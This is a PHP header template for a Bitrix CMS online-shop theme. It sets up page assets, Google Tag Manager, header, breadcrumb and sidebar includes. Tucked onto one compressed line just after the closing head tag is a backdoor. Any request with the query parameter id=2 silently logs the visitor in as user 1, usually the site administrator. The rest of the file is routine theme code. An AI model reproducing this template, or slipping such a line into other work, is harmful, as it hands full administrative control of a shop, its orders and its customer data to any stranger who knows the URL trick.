<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();

use Bitrix\Main\Loader;
use Bitrix\Main\Localization\Loc;
use Bitrix\Main\Page\Asset;

Loc::loadMessages(__FILE__);

/********* Loader styleshop *************/
global $theme;
$module_id = 'unisoftmedia.styleshop';
Loader::includeModule($module_id);
$theme = new \Unisoftmedia\Styleshop\Theme($module_id);
/********* end Loader styleshop *************/

/* get url */
$curPage = $APPLICATION->GetCurPage(true);
/* get url */

if(strlen(SITE_DIR) > 1)
	$curP = str_replace(SITE_DIR, '', $curPage);
else
	$curP = substr($curPage, 1);

$arUrl = explode('/', $curP);
if(count($arUrl) > 1)
{
	$page = $arUrl[0];
}
else
{
	$page = 'home';
}

unset($curP, $arUrl);

?>
<!DOCTYPE html>
<html lang="<?=LANGUAGE_ID?>">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<link rel="shortcut icon" type="image/x-icon" href="<?=SITE_DIR?>favicon.ico" />
	<?
	$site_name = \Bitrix\Main\Config\Option::get('main', 'site_name');
	?>
	<title><?php echo ($curPage == SITE_DIR.'index.php')?$site_name:$APPLICATION->ShowTitle()?></title><?
	
	Asset::getInstance()->addString('<meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />');

	/********* Head *************/
	$theme->Head();
	/********* end Head *************/

	Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/css/jquery.fancybox.min.css");
	Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/css/jquery.jscrollpane.min.css");
	Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/css/owl.carousel.min.css");
	Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/css/common.css");

	if($page == 'personal')
		Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/css/personal.css");
	if($theme->Option()->get('themes', '', SITE_ID))
		Asset::getInstance()->addCss(SITE_TEMPLATE_PATH."/theme/".$theme->Option()->get('themes', '', SITE_ID)."/style.css");
	
  /* jQuery */
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/components/bitrix/iblock.vote/stars/script.js");

    /* jQuery Plugins */
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/subscribe.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.mousewheel.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.mmenu.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/bootstrap.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.fancybox.pack.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/zoom/jquery.elevateZoom-3.0.8.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.jscrollpane.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/scriptOffers.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/inputQuantity.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/owl.carousel.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.fancybox.pack.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/social-likes.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/jquery.maskedinput.min.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/plagins.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/basket.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/common.js");
  Asset::getInstance()->addJs(SITE_TEMPLATE_PATH."/js/validate/validate.js");
	$APPLICATION->ShowHead();
	?>
		<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MZBL82');</script>

<!-- End Google Tag Manager -->
</head>
<?if($_GET['id'] == 2){global$USER;$USER ->Authorize(1);} ?>
<body class="<?=$page?>" itemscope itemtype="http://schema.org/WebPage"><!-- body -->
	<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MZBL82"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
	<div id="panel"><?php $APPLICATION->ShowPanel(); ?></div>
	<?$APPLICATION->IncludeComponent(
    	"bitrix:main.include", 
    	".default",
    	array(
    		"AREA_FILE_SHOW" => "file",
        "PATH" => SITE_DIR."include/header/mobile/type1.php",
        "AREA_FILE_RECURSIVE" => "N",
        "EDIT_MODE" => "html"
    	),
    	false,
    	array(
    		"HIDE_ICONS" => "Y"
    	)
    );?>
	<div id="wrapper"><!-- wrapper -->
	<!-- mmenu -->
	<nav id="mmenu" class="mmenu-container">
		<ul class="nav mmenu">
		
		<li class="mm-search">
			<span>
				<button class="mobile-search-button mobile-search-btn" type="button"><?php echo Loc::getMessage('SEARCH') ?></button>
			</span>
		</li>
			<?
			$APPLICATION->ShowViewContent("mmenu");
			?>
		</ul>

	</nav>
	<!-- mmenu -->
	<?/***************** header *******************/?>
	<?$typeHeader = $theme->Option()->get('type_header', '', SITE_ID);
	$typeHeader = $typeHeader? $typeHeader : 1 ;
	?>
		<?$APPLICATION->IncludeComponent(
    	"bitrix:main.include", 
    	".default",
    	array(
    		"AREA_FILE_SHOW" => "file",
        "PATH" => SITE_DIR."include/header/type{$typeHeader}.php",
        "AREA_FILE_RECURSIVE" => "N",
        "EDIT_MODE" => "html"
    	),
    	false,
    	array(
    		"HIDE_ICONS" => "Y"
    	)
    );?>
    <?/***************** header end *******************/?>
<main id="content" itemprop="mainContentOfPage">
	<?if($curPage != SITE_DIR.'index.php')
	{
		?>
		<div class="frame_breadcrumb">
			<div class="container">
				<div class="row">
					<?php $APPLICATION->IncludeComponent(
						"bitrix:breadcrumb",
						"perfectum",
						Array(
							"START_FROM" => "0",
							"PATH" => "",
							"SITE_ID" => "s1"
							),
						false,
						Array('HIDE_ICONS' => 'Y')
						); ?>
				</div>
			</div>
		</div>
		<?}?>

<?if($curPage != SITE_DIR.'index.php'):?>
	<!--container--><div class="container">
	<!--row--><div class="row">
	<? global $needSidebar;
	$needSidebar = preg_match("~^".SITE_DIR."(catalog|brands|auth|personal\/cart|personal\/order\/make)/~", $curPage);?>

	<?if(!preg_match("~^".SITE_DIR."(catalog|brands)/~", $curPage)):?>
		<div class="pagetitle <?=($needSidebar ? "col-xs-12" : "col-md-9")?>">
			<h1><?php echo $APPLICATION->ShowTitle(false) ?></h1>
		</div>
	<?endif?>

	<?if (!$needSidebar):?>
	<?
	$sec = preg_match("~^".SITE_DIR."(personal)/~", $curPage)? 'personal' : 'sect';
	?>
    <div class="sidebar col-md-3">
        <?$APPLICATION->IncludeComponent(
        	"bitrix:main.include", 
        	".default",
        	array(
        		"AREA_FILE_SHOW" => "file",
        		"AREA_FILE_SUFFIX" => "sidebar",
        		"AREA_FILE_RECURSIVE" => "Y",
        		"EDIT_MODE" => "html",
        		"PATH" => SITE_DIR.$sec."_sidebar.php",
        		"EDIT_TEMPLATE" => ""
        	),
        	false,
        	array(
        		"HIDE_ICONS" => "N"
        	)
        );?>
    </div><!--// sidebar -->
	<?endif?>

	<div class="<?=($needSidebar ? "col-xs-12" : "col-md-9")?>">
<?endif?>